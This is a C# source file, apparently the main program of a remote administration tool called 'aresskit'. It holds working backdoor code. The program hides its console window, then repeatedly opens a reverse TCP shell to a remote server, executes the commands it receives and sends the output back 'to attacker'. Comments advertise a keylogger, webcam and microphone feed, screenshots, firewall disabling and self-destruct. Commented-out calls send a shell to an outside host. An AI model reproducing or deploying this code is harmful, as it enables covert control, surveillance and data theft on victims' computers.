using System;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace aresskit
{
    class Program
    {
        const string server = "localhost";
        const int port = 9000;
        const bool hideConsole = true;
        
        private static void sendBackdoor(string server, int port)
        {
            try
            {
                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                System.Net.Sockets.NetworkStream stream = client.GetStream();
                string responseData;

                while (true)
                {
                    byte[] shellcode = Misc.byteCode("aresskit> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");

                    // String to store the response ASCII representation.

                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    responseData = responseData.Replace("\n", string.Empty);

                    if (responseData == "cd")
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    else if (responseData == "exit")
                        System.Environment.Exit(0); // Exit application
                    else if (responseData == "help")
                    {
                        string helpMenu = "\n";
                        var theList = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.Namespace == "aresskit").ToList();
                        theList.RemoveAt(theList.IndexOf(typeof(_)));

                        foreach (Type x in theList)
                        {
                            if (x.Name != "<>c" && x.Name != "LowLevelKeyboardProc") // To rid away unused Classes
                                helpMenu += Misc.ShowMethods(x) + "\n";
                        }

                        output = Misc.byteCode(helpMenu);
                    }
                    else
                    {
                        try
                        {
                            if (!responseData.Contains("::"))
                            {
                                if (responseData != "")
                                    output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                            }
                            else
                            {
                                responseData = responseData.Trim(); // To eliminate annoying things in the string

                                // Will produce: (clas name), (method name), [arg](,)[arg]...
                                string[] classMethod = responseData.Split(new[] { "::" }, StringSplitOptions.None);


                                Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
                                object classInstance = Activator.CreateInstance(methodType); // Create instance of 'aresskit.Class'

                                string[] methodData = classMethod[1].Split(new char[0]);
                                MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                if (methodInstance == null)
                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + "::" + classMethod[1] + "'");
                                ParameterInfo[] methodParameters = methodInstance.GetParameters();


                                string parameterString = default(string);
                                string[] parameterArray = { "" };

                                if (methodInstance != null)
                                {
                                    if (methodParameters.Length == 0)
                                    {
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
                                    }
                                    else
                                    {
                                        if (methodParameters[0].ParameterType.ToString() == "System.String")
                                        {
                                            for (int i = 1; i < methodData.Length; i++)                                            
                                                parameterString += methodData[i] + " ";
                                            parameterArray[0] = parameterString;
                                        }
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                        // Console.WriteLine(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            output = Misc.byteCode(e.ToString() + "\n");
                        }
                    }

                    try
                    {
                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                    }
                    catch (System.IO.IOException)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
        }

        static void Main(string[] args)
        {
            // Hide Window
            if (hideConsole)
                Toolkit.HideWindow();
            
            // Fully featured Remote Administration Tool (RAT)
            /*
             * Aresskit comes equipped with networking tools and administration tools such as:
             * - Built-In Port Scanner
             * - Reverse Command Prompt Shell (minimalistic, no auth required)
             * - UDP/TCP Port Listener (similar to Netcat)
             * - File downloader/uploader
             * - Live Cam/Mic Feed (extra-fee)
             * - Screenshot(s)
             * - Real-Time and Log-based Keylogger
             * - Self-destruct feature (protect your privacy)
            */
            aresskit.Scanner scanner = new aresskit.Scanner();
            // scanner.portScanner("localhost", null, true); // public void portScanner(string hostname, Array range, bool verbose)
            // scanner.netDiscover();
            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
            }).Start();
            */

            // scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
            // scanner.NetDiscover();

            aresskit.Toolkit toolkit = new aresskit.Toolkit();
            // toolkit.selfDestruct();
            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
            // toolkit.portListener(9000, "tcp");
            // toolkit.listenShell(9000);
            // Console.WriteLine("Connected to the internet? " + toolkit.checkInternetConn("www.google.com"));
            // toolkit.Shell(9000);
            // toolkit.portListener(9000, "tcp");

            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                Console.WriteLine("Thread is running...");
                // run your code here
                toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
            }).Start();
            */
            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);

            aresskit.Administration system = new aresskit.Administration();
            // Console.WriteLine("Running in Virtual Machine? " + system.DetectVirtualMachine());
            // Console.WriteLine("Running as Administrator? " + system.IsAdmin());
            // Console.WriteLine(system.IsAdministrator() == true ? system.FirewallStatus(false) : false); // if admin is true, disable firewall

            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                Console.WriteLine("Thread is running...");

                InterceptKeys.logKeys();
            }).Start();
            */

            // ScreenShot.CaptureAndSave(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, @"C:\\development\\Capture.png");

            while (true)
            {
                if (Network.checkInternetConn("www.google.com") == true)
                {
                    try
                    {
                        // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                        if (args.Length != 0)
                            sendBackdoor(args[0], int.Parse(args[1]));
                        else
                            sendBackdoor(server, port);
                    }
                    catch (Exception)
                    {} // pass silently
                }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
        }
    }
}
